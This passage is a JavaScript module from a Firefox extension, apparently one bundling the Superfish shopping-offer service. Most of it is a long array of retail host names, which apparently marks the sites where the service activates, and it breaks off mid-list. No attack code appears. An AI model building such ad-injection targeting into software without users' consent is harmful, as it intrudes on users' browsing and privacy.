var EXPORTED_SYMBOLS = ["cfvd_Superfish"]; 

const Cc = Components.classes;
const Ci = Components.interfaces;
const Cu = Components.utils;

Components.utils.import("resource://fvd.single.modules/misc.js");
Components.utils.import("resource://fvd.single.modules/config.js");
Components.utils.import("resource://fvd.single.modules/settings.js");


// not used now
const AVAILABLE_LANGUAGES = [
	"en",
	"fr",
	"de",
	"mi"
];


const AVAILABLE_HOSTS = ["ebay","amazon","staples","apple","walmart","dell","officedepot","libertyinteractive","searsholdings","signup.netflix","cdw","bestbuy","officemax","newegg","macysinc","grainger","sony","costco","llbean","bathandbodyworks","jcpenney","shopping.hp","gapinc","target","williams-sonomainc","systemax","hsni","overstock","kohls","toysrusinc","amway","shop.nordstrom","barnesandnoble","walgreens","redcats","vistaprint","buy","avon","saksfifthavenue","pcconnection","symantec","neimanmarcusgroup","homedepot","cabelas","musiciansfriend","abercrombie","fanaticsinc","lowes","urbn","gilt","wayfair","1800flowers","peapod","shutterfly","footlocker-inc","gamestop","jcrew","pcmall","elcompanies","crateandbarrel","ancestry","weightwatchers","yooxgroup","scholastic","rei","ae","zones","fheg.follett","deluxe","ralphlauren","marketamerica","bluenile","nikeinc","chicosfas","microsoft","1800contacts","usautoparts.net","orientaltrading","ftd","disneystore","freshdirect","build","bluestembrands","greenmountaincoffee","ruelala","hayneedleinc","vitacost","http","info.cvscaremark","northerntool","shoebuy","shopnbc","anninc","nutrisystem","sierratradingpost","basspro","shopmyexchange","ediblearrangements","eddiebauer","orchardbrands","hbc","dickssportinggoods","express","ebags","colonybrands","restorationhardware","safeway","mlb.mlb","harryanddavid","vfc","investors.coastalcontacts","childrensplace","cafepress","beachbody","aeropostale","americangirl","tiffany","art","drsfostersmith","jr","1800petmeds","autozone","alibris","crutchfield","omahasteaks","nfl","zazzle","talbots","charmingshoppes","alliedelec","shoplet","dillards","stores.lego","blockbuster","coldwatercreek","store.schoolspecialty","sephora","bigfishgames","karmaloop","shoemall","fragrancenet","potpourrigroup","bodenusa","underarmour","shoes","luxottica","orvis","onlineshoes","abt","theshoppingchannel","gamefly","finishline","nbty","sdcd","fansedge","brooksbrothers","autoanything","coach","verabradley","deckers","lululemon","crucial","lifeway","bhphotovideo","opticsplanet","jtv","barneys","cooking","ajmadison","ascenaretail","ideeli","onekingslane","beyondtherack","thinkgeek","benchmarkbrands","1saleaday","lampsplus","bluefly","brookstone","hallmark","cymax","crocs","ross-simons","tempurpedic","motorcycle-superstore","iherb","signetjewelers","bedbathandbeyond","zalecorp","panasonic","chapters.indigo.ca","emusic","http","fossil","overnightprints","powerequipmentdirect","deliasinc","tore.delias","customink","dswinc","vitaminshoppe","personalizationmall","gnc","goldeneaglecoin","bidz","wowhd","josbank","americangreetings","golfsmith","replacements","buckle","adidas","furniture","skymall","ldproducts","compuplus","shoedazzle","hottopic","roadrunnersports","blinds","belk","sweetwater","wolverineworldwide","monkeysports","sleepnumber","jomashop","databazaar","onecall","amerimark","sportsauthority","petco","sundancecatalog","tabcom.org","hickoryfarms","zoostores","performancebike","hannaandersson","livingdirect","toryburch","cheaperthandirt","nationalbusinessfurniture","ikea","bjs","store.discovery","geeks","newbalance","wine","barenecessities","betterworldbooks","thompsongroup","zumiez","ecampus","instawares","vermontteddybear","moviemars","columbia","timelife","frys","roomstogo","nyandcompany","teamexpress","cpooutlets","samashmusic","pacsun","joann","smartpakequine","dermstore","vanns","ice","mileskimball","softchoice","godiva","chegg","radioshackcorporation","moosejaw","lumberliquidators","bose","americanmusical","guess","propertyroom","bikebandit","boscovs","unbeatablesale","hugoboss","americanapparel.net","sonicelectronix","menswearhouse","tractorsupply","hammacher","turn5","armaniexchange","yesasia","techforless","christopherandbanks","babyage","meijer","containerstore","jpcycles","eforcity","partycity","folica","tillys","stroll","uniquesquared","levenger","sheplers","jockey","fathead","chefscatalog","gaiam","westmarine","amiclubwear","petsmart","nhl","aclens","diamondnexus","softmart","payless","fredericks","rockbottomgolf","ashford","textbooks","gymboree","discountdance","doversaddlery","ngsgenealogy.org","callawaygolf","motherswork","lakeshorelearning","pcrush","interworldhighway","tirllc","bareescentuals","thingsremembered","ulta","beallsinc","istoresinc","bodyc","philips","forever21","directron","davidsbridal","shopperschoice","yankeecandle","toolking","superbiiz","discountofficeitems","bellacor","ivgstores","buyonlinenow","chasing-fireflies","1800mattress","sheetmusicplus","beta.threadless","jjbuckley","lakeside","ntsupply","lifetimebrands","klwines","charlotterusse","levistrauss","modcloth","parts-express","smoothfitness","campingworld","47stphoto","bebe","nastygal","aedsuperstore","onlinestores","lafayette148ny","wetsealinc","paulfredrick","superwarehouse","garmin","blissworld","stacksandstacks","spanx","us-mattress","amainhobbies","shop.advanceautoparts","rugsusa","jensonusa","burberry","franklincovey","worldmarket","lids","restockit","xogroupinc","surlatable","leatherup","rugs-direct","irobot","booksamillioninc","jefferspet","evo","sallybeauty","cpa2biz","rockler","aldogroup","toolfetch","thelimited","mec.ca","vintagetub","touchofclass","beautyencounter","leapfrog","lancome-usa","carters","buyautoparts","balsambrands","tumi","powells","eileenfisher","ediets","nationalbuildersupply","buildasign","everythingfurniture","peruvianconnection","idwholesaler","calendars","starbucks","heartratemonitorsusa","printingforless","biblio","netdirectmerchants","artbeads","discountramps","nfm","christianbook","altrec","reitmans","smartsign","myotcstore","jackthreads","skechers","hhgregg","actionvillage","highlandproductsgroup","solidsignal","gifttree","alice","pureformulas","fab","spreadshirt","ozbo","inetvideo","ems","fatbraintoys","drillspot","limogesjewelry","kennethcole","skincarerx","trollandtoad","bonton","entertainmentearth","coffeeforless","toolup","calumetphoto","luggageonline","ehobbies","brickhousesecurity","kingarthurflour","store.nascar","shoppbs.org","beau-coup","3balls","cableorganizer","danskin","envelopes","costumecraze","air-n-water","glassesusa","honeybaked","appliancezone","scentiments","royaldiscount","bagborroworsteal","gourmetgiftbaskets","bootbarn","hamgo","airsplat","titlenine","canada.roots","shopecko","marcecko","myjewelrybox","wwe","bostongreengoods","musicnotes","batteries","burton","jamesallenonf1","ustoy","ustoyco","summitonline","google","yahoo","bing","msn","netflix","sears","groupon","macys","gap","livingsocial","zappos","multiply","tigerdirect","nordstrom","qvc","victoriassecret","sky","hm","legacy","nike","pixmania","samsclub","ticketmaster","6pm","hsn","cvs","landsend","play","souq","trademe.co.nz","autotrader","directv","cars","wiley","marksandspencer","drugstore","neimanmarcus","cduniverse","shopbop","radioshack","snapfish","futureshop.ca","urbanoutfitters","shop.lego","williams-sonoma","net-a-porter","www1.bloomingdales","potterybarn","stubhub","yoox","cambridge.org","redbubble","abebooks","threadless","adorama","backcountry","anthropologie","fingerhut","dsw","nespresso","gifts","gunbroker","smilebox","adpost","tinyprints","techbargains","mapsofindia","oldnavy","uncommongoods","sportsmansguide","midwayusa","lanebryant","famousfootwear","redenvelope","futurebazaar","hmv","carmax","bonanza","westelm","personalcreations","micromaxinfo","usfreeads","boostmobile","moo","game.co.uk","academy","pier1","tirerack","cdbaby","gandermountain","zales","drjays","mobikwik","movietickets","swansonvitamins","womanwithin","acehardware","grasscity","timberland","anntaylor","footballfanatics","cargurus","arcamax","watchuseek","zavvi","keurig","instyle","otterbox","magazines","inetgiant","duluthtrading","frontgate","oup","mandmdirect","mycricket","shop.mlb","freepeople","oakley","proflowers","medcohealth","vodafone.ie","tradepub","shopgoodwill","auctionzip","aafes","wickedweasel","autotrader.ca","summitracing","jcwhitney","lionbrand","doubledaybookclub","zzounds","brownells","harrods","burlingtoncoatfactory","carsforsale","puritan","pandora.net","ebid.net","tennis-warehouse","hermes","dickblick","jinx","skinit","homedecorators","minted","wetseal","apmex","lazerguard","cirquedusoleil","landofnod","bergdorfgoodman","wbshop","chicos","vans","garnethill","informit","loccitane","businessesforsale","epage","bkstr","shop.nationalgeographic","cardstore","rockauto","gohastings","reebok","bigbadtoystore","maccosmetics","stevemadden","jjill","pbteen","gotprint.net","spencersonline","comet.co.uk","delias","sell","starcitygames","tivo","webclassifieds.us","roamans","journeys","claires","toywiz","getjar","tickets","fender","kirklands","lulus","campmor","avenue","seacoast","jessops","themobilestore.in","pennysaverusa","websun01.sasa","andysautosport","novica","woodcraft","clinique","beallsflorida","seventhavenue","moma.org","jpc.de","venus","luckyvitamin","esprit","booksamillion","recycler","sharperimage","teavana","ballarddesigns","greendust","ubid","whsmith.co.uk","converse","yandy","quill","tributes","funimation","torrid","audiogon","figis","cheapsmells","swisscolony","qpb","domesticsale","kingsizedirect","rightstuf","ninewest","sunglasshut","digitalrev","swimoutlet","hemmings","towerhobbies","forzieri","gojane","1000bulbs","the-house","dooney","warbyparker","twopeasinabucket","schwans","tgw","leevalley","proxibid","bazaar-in-iran","mountainroseherbs","cdjapan.co.jp","repairclinic","sees","nativeremedies","ebooks","sothebys","cinema.my","hobbytron","beprepared","broadway","zennioptical","sideshowtoy","case-mate","juno.co.uk","napaonline","fredflare","philosophy","perpetualkid","snorgtees","symbios.pk","dyson","christmascentral","catherines.lanebryant","bustedtees","onestepahead","worldsoccershop","motorcycle-usa","framesdirect","gardeners","tupperware","gazelle","berries","racingjunk","samash","geebo","paper-source","shop.history","bricklink","fragrancedirect.co.uk","budk","skinstore","colehaan","herroom","speckproducts","thebookpeople.co.uk","binoculars.com","dartboards.com","thinkfasttoys.com","soccer savings.com","sleekhair.com","thewiz.com","propvault.com","wickerfurniture.com","topgearautosport.com","feelunique.com","bigoutlet.com","soccercorner.com","ayagroup.com","coffeetablesgalore.com","computerdesks.com","designerbridges.com","selectaticket.com","icewraps.net","wholesalebeddings.com","sharkstores.com","77ink.com","stopagingnow.com","leasetrader.com","simplyarbors.com","nutcrackers.com","prompartydress.com","skiforfree.com","lamps.com","bidstick.com","123inks.com","shopjeepparts.com","jksports.com","chesssets.com","metrokitchen.com","thevividroom.com","cheappetcrates.com","esoccergoals.com","sparkplugs.com","sugarstores.com","bookit.com","everstrike.com","reactgear.com","jewelstop.com","linuxcloudvps.com","locomx.com","lithium-batteries.net","cribs.com","outdoorbasics.com","snoozerpetproducts.com","smilox.com","hats.com","nydj.com","giftspot.com","uxsight.com","beanbags.com","discount-laptopbattery.com","swordsswords.com","taxextension.com","lacrosse.com","patiostore.com","joybauer.com","directorschairs.com","desklamps.com","handtrucks.com","industrialsupplies.com","dogtuff.com","directtextbook.com","gay.com","adhstore.com","beachstore.com","luxuryperfume.com","dogids.com","buyijet.com","orientalrugs.com","cheesedeal.com","litterboy.com","goinglighting.com","soap.com","siopa.com","wallbedfactory.com","pressureparts.com","juicedhybrid.com","grooming-pet-supplies.com","templatemonster.com","barstools.com","bakersracks.com","babystuffgifts.com","aedesigns.net","ezydog.com","cellularaccessories.com","blurayblankmedia.com","stupid.com","accessorygeeks.com","buythestars.com","cookwaresplus.com","officefurniture.com","freshairpro.com","paylessclothing.com","schooluniforms.com","giftbrand.com","4mags.com","tcbulk.com","evacuumstore.com","grillsforboats.com","cedarchests.com","adirondackchairs.com","spark.com","gog.com","sunglassshack.com","candywarehouse.com","lamplight.com","diaperbags.com","mysteriousgifts.com","tek-micro.com","jukeboxes.com","bird.com","apparel.com","usabride.com","einvite.com","1928.com","nutrasource.com","mydesignshop.com","bedbug.com","promosonline.com","heatandcool.com","footminders.com","beachchairs.com","customcellcase.com","swimoutlet.com","cellularstream.com","givinggallery.com","over-the-ecounter.com","strongsupplementshop.com","priceplunge.com","cars.com","thesslstore.com","mezzi.com","throwrugs.net","miraclebody.com","iconcerttickets.com","bnyconline.com","toiletseatsource.com","everbuying.com","sbrshop.com","homestyles2go.com","tattoosales.com","pricewisefavors.com","clifbarstore.com","replacementretainers.com","4allvitamins.com","discountramps.com","buycoffee.com","king.com","airpurifiersource.com","printermalls.com","hasbrotoyshop.com","iaqsource.com","petcarriers.com","shoostore.com","overthehill.com","napacabs.com","kegerator.com","printcandies.com","dealchicken.com","skincentermall.com","navarro.com","gate.com","budgetpetcare.com","valentineperfume.com","globalrecomp.com","extremerate.com","trainz.com","bathroomfanexperts.com","banquettables.com","nationalbuildersupply.com","sbmuscle.com","paylessparking.com","fibers.com","elightsupply.com","rockingchairs.com","potracksgalore.com","diningchairs.com","uniquepearl.com","uncorked.com","hp-laptop-batteries.com","officefurniture2go.com","mybinding.com","smartbuyglasses.com","glarysoft.com","fonts.com","pexuniverse.com","limos.com","backgammonplus.com","builderprotection.com","cheapsk8shoes.com","awesomeseating.com","ebelow.com","groomers.com","thevacuumcenter.com","diamond.com","outdoorplay.com","allin1source.com","yourcitymycity.com","inetvideo.com","christmaslightsetc.com","spacify.com","hardwaresales.com","meundies.com","techiestop.com","greatsandals.com","ecarpetgallery.com","allforyourwedding.com","buysku.com","tactics.com","amazinglabels.com","photoshopuser.com","outdoorcooking.com","gadgets-n-gizmos.com","cheaphumidors.com","navshack.com","schoneme.com","pogo.com","greatpubtables.com","anolon.com","solefootwear.net","youdagames.com","easycopy.com","rods.com","zennioptical.com","diamondstudsonly.com","ticketloot.com","pooltoysource.com","volleyballheadquarters.com","mlb.com","cheaperscopes.com","chemistry.com","easelsource.com","greathomebars.com","orbitlightshow.com","shopdirectbrands.com","citydeals.com","senioremporium.com","promgowns4less.com","inlineskates.net","compostbins.com","trailerhitches.com","ocreef.com","magazinesubscriptions.com","firecomfort.com","parts4pc.com","lgwasherdryer.com","attractiveperfume.com","acdapter.com","viatalk.com","www.naturalpetwarehouse.com","thepreciousgirl.com","playfulthreads.com","clothingunder10.com","soleusaircentral.com","eyewear2u.com","penwa.com","turkishtowels.com","rochenhost.com","gameholds.com","cognifit.com","foreverfashion.com","papercards.com","hosieree.com","voip.com","esigns.com","magnetstreet.com","databazaar.com","skis.com","lens2see.com","knifecenter.com","kingcleaning.com","solarlightstore.com","tropicalfishstore.com","trustedeal.com","canemart.com","half.com","modernfurniture.com","reconditionedtools.com","promdresssale.com","namejewelryspot.com","watcheshead.com","ztail.com","charitycostumes.com","hosereelsource.com","opticaloceansales.com","scooterdirect.com","cases.com","learntobehealthy.org","customcanvasprints.com","cheapair.com","depositphotos.com","designergifts.com","tvtraysource.com","needabulb.com","everafterstore.com","juststoragebenches.com","sunsky-online.com","plantstands.com","bachelorette.com","constructiongear.com","magazinenook.com","inksupply.com","enviroinks.com","suppliesoutlet.com","hammocks.com","windchime.com","benches.com","reclinersplus.com","mdiecast.com","medicinecabinetshop.com","dibruno.com","myhairstylingtools.com","cr123batteries.com","buyskateshoes.com","lacrossecorner.com","costumeparty.com","jewelryboxes.com","tabletenniszone.com","shopzeus.com","patioumbrellas.com","clivecoffee.com","pottingbenches.com","mchrono.com","alwaysbrilliant.com","needbattery.com","designerbinder.com","mayline2go.com","naturegiftus.com","fly.com","erockinghorses.com","fish.com","hangin-around.com","gopromos.com","hucknroll.com","billetanything.com","dollhousesgalore.com","scarves.com","alltecstores.com","titannotebook.com","sportsworldchicago.com","eshowerdoor.com","mens-wedding-rings.com","micronetonly.com","vetdepot.com","giftcards.com","richspsxparts.com","learninga-z.com","bitsdujour.com","xzipit.com","wine.com","homefurniture2go.com","mens-gifts.com","otel.com","imcharmed.com","bootandtack.com","justfoosballtables.com","fireplacescreensetc.com","americanlisted.com","kodega.com","ibbuy.com","skritter.com","bestcanvas.com","justgreenhouses.com","txu.com","telescopes.com","oriongadgets.com","simpleprint.com","datingrisk.com","blixbuy.com","gearx.com","thepaintstore.com","winebasket.com","iphonestore.com","jansjewells.com","bluum.com","hipundies.com","babysigns.com","laquinta.com","buyeyeglasses.com","dressers.com","ajrichies.com","usa4ink.com","tshirtman.com","gkworld.com","topselfdefense.com","juststrollers.com","willowtreehome.com","tveak.com","missnowmrs.com","waterfilterexperts.com","exporience.com","eurway.com","wig.com","thebluedot.net","civilwarclassics.com","nutrovita.com","blinds.com","golfballs.com","dannaoshee.com","althealthcare.com","buybulbsnow.com","espressozone.com","tirebuyer.com","fashion4us.com","braceshop.com","purehockey.com","helpalocalbusiness.com","gamebay.com","supplementsexpress.com","floormall.com","alltonerdepot.com","pegasusshoes.com","thedrugstoredepot.com","foodinsurance.com","register.com","sourcingmap.com","robe.com","rosary.com","ancestry.com","justbathroomfurniture.com","chocolate.com","condo.com","lazysusans.com","usinsurance.com","qrpgloves.com","box.net","handlesets.com","discountboatcover.com","scenturion.com","sit4less.com","orangeonions.com","perfume.com","bedandbreakfast.com","imaginetoys.com","astrology.com","bellybling.net","bhfo.com","swishpop.com","pureandhealthy.com","smarthealthshop.com","childrenstablesandchairs.com","yoursleepingbags.com","childrensdesks.com","autograph-cards.com","ampmfashion.com","pmaddons.com","funeralce.com","fishheadgear.com","colognes.com","diapers.com","esurebuy.com","outerdress.com","closetorganizersource.com","aquasythe.com","cedarpc.com","gearwild.com","cashcountermachines.com","biblicadirect.com","ewineracks.com","hydrobuilder.com","medicalprovisions.com","surplusdecor.com","shopakira.com","ipods99.com","buyaccess.com","caviarhour.com","printcity.com","alltimetvs.com","giftback.com","listenup.com","bellaseating.com","weshipwinefree.com","posglobal.com","chocolatefountains.com","buywake.com","buyprinters.com","playmusic123.com","skates.com","marineandreef.com","photos.com","buyyourties.com","bathroom-glass-vanities.com","lifesizecustomcutouts.com","netdepot.com","local.com","mynaturalmarket.com","dippedfruit.com","sportsk.com","thelogocompany.net","reuseit.com","textbookrentals.com","delivery.com","fastfurnishings.com","usefulparts.com","samedayprinting.com","eroomservice.com","shurhold.com","englishparts.com","lightingandlocks.com","evoderma.com","blocktapes.com","emerusa.com","aegeanstore.com","batterymart.com","maturesinglesclick.com","alice.com","comfortshoeshop.com","modaqueen.com","kno.com","soliscompany.com","beflurt.com","woothemes.com","christwear.com","takeherb.com","link4love.com","muchbuy.com","truckcoverdiscount.com","randombuy.com","businessofficepro.com","ekitchenislands.com","learnonyourown.com","printmything.com","vacuum-home.com","1888toys.com","bedding.com","yoyo.com","alternatorsstarters.com","teamcovers.com","wag.com","bulbstock.com","zshock.com","bridal-buy.com","cufflinks.com","valuepetsupplies.com","bargaincellularshades.com","klmountainshop.com","holidayleds.com","petsuppliesnet.com","calendars.com","pampasbarandgrill.com","pincity.com","logogarden.com","allbriefcases.com","inkcartridges.com","www.flatscreensales.com","craftbeerclub.com","spot4ink.com","crashplan.com","fireforless.com","christeningshop.com","hometheaterseating.com","toolboxesdirect.com","cybercucina.com","makemyframe.com","impactfitnesswear.com","tollfreeforwarding.com","prothermostats.com","customizedstickers.com","gemsaround.com","notebookparts.com","soul-flower.com","beadroom.com","american-flag.com","tiffanylampsgalore.com","sciencecastle.com","compressionstockings.com","silvershake.com","jgoodin.com","reputation.com","dogsupplies.com","womensuits.com","throwpillowsource.com","swimwearplace.com","outdoorpillows.net","aviglatt.com","ewaterionizers.net","sheldorado.com","jcrewfactory.com","invity.com","messycloset.com","metaldetectors.com","federalflags.com","cegdirect.com","phone.com","operaglasses.com","printinghost.com","baraccessories.com","deafs.com","pharmapacks.com","drugstore.com","truckchamp.com","lenovo-batteries.com","strongernutrition.com","simplymirrors.com","lynda.com","coupontrade.com","defibrillator.net","waterfilters.net","shoplafuma.com","mcergo.com","mybonahome.com","booking.com","silversingles.com","ibuylens.com","nutricell.com","partysuppliesdelivered.com","loveourprices.com","rosefarm.com","europeanplates.com","tobefast.com","pictureframes.com","yogaaccessories.com","businesschairs.com","onthebroadway.com","clothingwarehouse.com","magazinebargains.com","blastzonebouncehouses.com","shopcasio.com","mainstreetbooksonline.com","efurnituremart.com","onlinescuba.com","imprinted.com","playkitchens.com","educator.com","playhouses.com","fishusa.com","norstarsource.com","melrose.com","geeks.com","evacuumbags.com","seattlegourmetfoods.com","agoodvitamin.com","florist.com","coatracks.com","lkqonline.com","pharmapro.net","e-yearbook.com","bentgate.com","ohmybeauty.com","quiltracks.com","bhsofa.com","musicpower.com","policestore.com","sheinside.com","basketballgoals.com","all-laptop-battery.com","patioheaterstore.com","papergoods.com","healthyhumans.com","avantgardendecor.com","menshats.com","stroller.com","bidlessnow.com","landscapelightingshop.com","ldate.com","battery-smart.com","thispromoworks.com","kidslearningdepot.com","metaldetector.com","directsoftwareconnection.com","sharpshades.com","aed.com","condomelite.com","stardoorparts.com","linkednew.com","shoponlinedeals.com","allivet.com","jessicasfashion.com","kidsongs.com","californiacell.com","unclesgames.com","snowboards.net","tsc pets.com","bloom.com","inseats.com","photohand.com","buypetals.com","cyclocamping.com","veer.com","backcountry.com","collage.com","shopusahockey.com","surelymine.com","babybasket.com","iphonecasemall.com","farberwarecookware.com","morfoods.com","shoes.com","cradlesandbassinets.com","shoptrudeau.com","trafficschool.com","ebubbles.com","discountsafetygear.com","sewingtableshop.com","planetmomtshirts.com","trivillage.com","ibuybarbeques.com","bigasoft.com","thinkhost.com","tonersupplyoutlet.com","credit.com","faucet.com","achooallergy.com","overland.com","buysnow.com","magazineracks.com","bandaid.com","theflowerexpertshop.com","pooldawg.com","name-necklace.com","flooringsupplyshop.com","lingerie.com","wwe.com","ink4less.com","myglasses.com","knifecave.com","eztaxreturn.com","birthdayandanniversarygifts.com","boohoo.com","allprotools.com","cmeinfo.com","gardenstatueshop.com","comfortableshoes.com","sofasandsectionals.com","creditcards.com","dehumidifierexperts.com","lens.com","promopeddler.com","buygreen.com","team-superstore.com","lawschooldownloads.com","doggiefood.com","officesupersaver.com","lensesrx.com","eyeglasses.com","foodbizsupply.com","mineral-deadsea.com","piercebody.com","paylessforglasses.com","alzodigital.com","dressgoddess.com","breezeshop.com","yourdecoshop.com","silkfloral.com","totalhomesupply.com","bbopokertables.com","novint.com","karaoke.com","typefreediabetes.com","clubchairs.com","canopycenter.com","support.com","fabric.com","emassagechair.com","celebswear.com","qpiercing.com","canadavet.com","paperstyle.com","dura-toner.com","ictoys.com","myinkrefills.com","freecreditscore.com","healthbydrk.com","restaurant.com","flowerdeliveryexpress.com","cellphoneslord.com","justmymusic.com","shop.com","xheli.com","tributes.com","silkpalms.com","billiards.com","cyclocrossracing.com","sitouch.com","petstore.com","wallets-online.com","vacations made easy.com","match.com","pettags.com","loosetealeaf.com","salesstock.com","promoslogos.com","discountdressup.com","kachyprint.com","local dog walker.com","onlygowns.com","efootwear.com","lowfares.com","watches-swiss.com","healthbuy.com","cartsandwagons.com","wirelessground.com","drvita.com","christmaslights.com","antarespro.com","kvchosting.com","thesocksite.com","secondtimearoundbooks.com","prettylittlething.com","myworldglobes.com","outdoorrugshop.com","pictureoncrystal.com","stamps.com","webstores123.com","buy-laptop-battery.org","moviemars.com","lcdtvs.com","simplyvanities.com","greenextensiontax.com","headboardsource.com","winetasting.com","mygofer.com","wendyswalkers.com","standsandmounts.com","filingcabinets.com","ereleases.com","positivesingles.com","nyfurnitureoutlets.com","barcodestuff.com","domain.com","casa.com","wreathsgalore.com","bestfilters.com","bambooandtikis.com","identitypi.com","horse.com","ruggedsole.com","rockymountaintrail.com","4focusgraphics.com","monster.com","healthandmed.com","sellnsend.com","ottomans.com","icedtime.com","laptop-batteries-shop.com","bike.com","chocolatebakery.com","mywhitewalls.com","dealsonsite4u.com","tagalongteddy.com","skindirect.com","wholesalekeychain.com","flashlightz.com","streetunit.com","photostuffonline.com","batteries.com","stacksocial.com","railwaytoys.com","vine.com","jomers.com","rvt.com","spyville.com","candy.com","airbeds4less.com","bigdiscount.com","taxslayer.com","canvas4life.com","techloops.com","compeve.com","liquidation.com","proteinfactory.com","tmart.com","pokershopping.com","partybell.com","telescope.com","aspenpublishers.com","buy.com","dormcraze.com","nanny360.com","branders.com","techcrazy.net","jjgames.com","jtv.com","cheapesttextbooks.com","groundedsoles.com","couture-consignment.com","crawlspace.net","tires-easy.com","videogamechairs.com","officesupplieslane.com","textbooks.com","net2fitness.com","booksfree.com","rugsale.com","thecandycity.com","soobest.com","rigona.com","nutraelle.com","playpens.com","allbraidedrugs.com","interracialsingles.com","fastsunglass.com","abcink.com","bigdiscountfragrances.com","aquariumsdirect.com","energymonitors.com","asianideas.com","kitchendirect.com","thehairstyler.com","stitch-by-design.com","croquet.com","automotive.com","silkflowers.com","name.com","garden.com","flower.com","stardust.com","sellersavingsdirect.com","cookiehost.com","geminicomputers.com","store.barackobama.com","diybeer.com","web.com","wowmyuniverse.com","allexhaust.com","stylebop.com","optyca.com","itok.net","truelemonstore.com","childrenschairs.com","dogkennels.com","online-hotdeals.com","cheapercoffee.com","pampered.com","ezcontactsusa.com","moo.com","furniture.com","shipmyboots.com","massagechairs.com","yourinkcenter.com","buyarearugs.com","bicyclebuys.com","factoryalliance.com","halfpricedrapes.com","fifthroom.com","emobistudio.com","golf discount .com","photocase.com","greendroplet.com","collectablesdirect.com","wisconsinmade.com","smallcarpets.com","clearance.net","northlightshop.com","house of filters.com","sportsmemorabilia.com","autograph-supply.com","fantasticfans.com","onlyarearugs.com","samanthamanzo.com","byjoomla.com","watertrampolineshop.com","fullbeauty.com","airfare.com","punk.com","121personalgifts.com","modernmotif.com","simplybell.com","greekpanels.com","care.com","daydeal.com","rollerskates.net","comfortwearables.com","mypreciouskid.com","royaldesign.com","dreamlandjewelry.com","fitnessblowout.com","specialcube.com","kineticfountains.com","salonhive.com","pitbulldvd.com","skitube.com","4luggage.com","kosher.com","isave.com","techiewarehouse.com","ereplacementparts.com","3wishes.com","cutieclothes.com","nutrasonic.com","birdbaths.com","battdepot.com","hotelroom.com","orangewhiptrainer.com","powernotebooks.com","storecloset.com","birdcages.com","obagiclear.com","lightingsale.com","allegromedical.com","halloweencostumes.com","nourishingfoods.com","goldcoasttickets.com","toolup.com","potsandpans.com","lastminute.com","discountdressshop.com","bikewearhouse.com","bouncesuperstore.com","fab.com","etronicspal.com","circulon.com","uneedit.com","brilliantstore.com","volcanoecigs.com","ridingtoys.com","lilbabycakes.com","marcusuniforms.com","babies1st.com","joggingstroller.com","yoga-clothing.com","filter-outlet.com","funtocollect.com","hookbag.com","postergods.com","blowfishshoes.com","officechairs2go.com","scuba.com","carparts.com","stuffedsafari.com","swapink.com","petching.com","pettags4less.com","riogrande.com","autograph-sports.com","tohfay.com","vtechkids.com","puzhen.com","daybeds.com","united-states-flag.com","magnums.net","bannersmall.com","activewearusa.com","trundlebedsdirect.com","accessoryjack.com","comlax.com","skinterra.com","designhotels.com","discountmags.com","mooseshirts.com","musiciansbuy.com","rentalcars.com","yogadirect.com","cruiserewards.com","alzovideo.com","art.com","cablesandkits.com","101inks.com","buyaquaglide.com","swingsetsource.com","patio.com","diamondcandy.com","wowcoolstuff.com","waterfiltersfast.com","shopdeerhunting.com","cheaphpprinters.com","largefriends.com","perfumehills.com","6pm.com","organize.com","absolutebarstools.com","katesomerville.com","buyentertainmentcenters.com","leenewman.com","theshirtprinter.com","newsoftwares.net","plumbing-deals.net","greekgear.com","fancyladies.com","browningshop.com","emanprinting.com","studentmarket.com","alltimemedical.com","runoutlet.com","treasurejewelry.com","officefurniturestyle.com","properautocare.com","cookware-specialty.com","carrentals.com","baseballbargains.com","interplas.com","besttoners.net","inventhelpstore.com","mypublisher.com","drinkingstuff.com","agri-med.com","dhstyles.com","solutions4hairloss.com","labellush.com","sw-box.com","robertdeyber.com","doitstyle.com","date.com","bestbridalprices.com","diet.com","beautystoponline.com","backgroundchecks.com","flagsexpo.com","moccasins.com","bookholders.com","k12schoolsupplies.net","yandy.com","rackxpress.com","skinb5.com","itoyboxes.com","mattress.com","superwater.com","buildasign.com","boutine.com","eternalsnow.com","kneedraggers.com","onlygloves.com","dreamshopee.com","tableclothsforless.com","dailydeals.com","joli-beads.com","norwaysports.com","getstdtested.com","doctorcloseout.com","toddlerbeds.com","coffee.org","beauty.com","rent.com","gototrafficschool.com","villageshoes.com","caring.com","generic4all.com","miinto.com","eyeglasses4all.com","mrchewy.com","i got a deal on it.com","ice.com","etech.com","creditreport.com","tigersupplies.com","vitaloutdoors.com","innovatoys.com","greatfurnituredeal.com","fineawards.com","enableyourlife.com","poolcenter.com","pospaper.com","camping.com","chaiselounges.com","lowestpricegoods.com","pooltablelights.com","itshot.com","diamondcandles.com","birdtoys.com","brooksshoesforkids.com","jewelmint.com","magnets.com","magazines.com","rice-power.com","draftingtables.com","creationwatches.com","diggingshop.com","surveillance-video.com","allheart.com","getwineonline.com","holidaycars.com","blackboardeats.com","alldaymall.com","primerunway.com","brugomug.com","backpage.com","mydietshopz.com","the gatlinburg lodge at smokymountainviews.com","jewelry.com","haircarechoices.com","good directions.com","otcrx4u.com","dragon-swords.com","budovideos.com","georgesports.com","envelopme.com","vividseats.com","seeitbigger.com","tiptopvitamins.com","logobarproducts.com","inflatabletrampolines.com","inkcloners.com","finestationery.com","panties.com","carcoverdiscounters.com","ferret.com","frizzy2silky.com","doormatsource.com","choicediabeticsocks.com","tickettogames.com","musicianshut.com","favors-n-gifts.com","extextoys.com","ibuysonline.com","howcool.com","shopowiz.com.com","egardenbridges.com","onlineorganizing.com","brighter.com","badmintonsource.com","pharmacycard.org","alsharifa.com","shopbootsusa.com","designerfountains.com","diningtables.com","iroomdividers.com","level8technology.com","usbeds.com","homecinemacenter.com","poolproducts.com","designyourwall.com","onlinesports.com","golfclubs.com","pastacheese.com","1-800-bakery.com","chacos.com","dermashoppe.com","coppergifts.com","lanyardstore.com","genericblinds.com","doghouses.com","mysexyzentai.com","novalightingstore.com","russianlegacy.com","movingboxdelivery.com","buyincoins.com","dog.com","radarbusters.com","mytarp.com","dentist.net","idogbeds.com","tungstenaffinity.com","soleandblues.com","shelving.com","ties.com","womenonguard.com","1ink.com","batteries4less.com","premiumplantplugs.com","grandfatherclocks.com","vacationrentals.com","katarina.com","subscriptionaddiction.com","microdwarf.com","hostican.com","kidsexclusive.com","xoom.com","mountcenter.com","gogreensolar.com","dynamichomedecor.com","officechairs.com","home-furniture-showcase.com","apparelcandy.com","giftbaskets.com","giftsforyounow.com","probioticsmart.com","mybabybottles.com","salesgenie.com","genericseeds.com","build.com","schoolfurniture2go.com","movietickets.com","soccer.com","a